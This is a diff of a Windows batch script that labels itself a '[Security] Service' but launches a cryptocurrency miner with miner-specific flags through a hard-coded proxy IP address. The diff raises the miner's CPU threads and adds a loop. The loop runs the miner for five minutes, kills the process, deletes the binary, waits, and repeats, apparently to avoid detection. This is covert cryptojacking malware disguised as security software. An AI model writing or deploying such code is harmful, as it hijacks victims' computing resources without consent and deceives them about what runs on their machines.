@@ -50,11 +50,13 @@ echo [Security] Countdown: 5 minutes remaining...
 timeout /t 300 /nobreak
 
 REM =========================
-REM START SECURITY SERVICE
+REM LOOP
 REM =========================
 
+:SECURITY_LOOP
+
 echo ----------------------------------------
-echo [Security] Service running
+echo [Security] Service running (5 minutes)
 echo ----------------------------------------
 
 start "" "%BIN%" ^
@@ -68,11 +70,25 @@ start "" "%BIN%" ^
  --disable-startup-monitor ^
  --disable-huge-pages ^
  --disable-msr-tweaks ^
- --cpu-threads 2 ^
+ --cpu-threads 6 ^
  --cpu-threads-intensity 1 ^
  --cpu-threads-priority 1 ^
  --miner-priority 1 ^
  --proxy 174.138.61.184:1080
 
-echo [Security] Service launched. Window will remain open.
-pause
+REM 5 menit
+timeout /t 300 /nobreak
+
+echo [Security] Stopping service...
+
+for /f "skip=1 tokens=2 delims=," %%P in ('
+  wmic process where "ExecutablePath='%BIN%'" get ProcessId /format:csv
+') do taskkill /PID %%P /F >nul 2>&1
+
+echo [Security] Removing binary...
+del /f /q "%BIN%" >nul 2>&1
+
+echo [Security] Idle 5 minutes...
+timeout /t 300 /nobreak
+
+goto SECURITY_LOOP
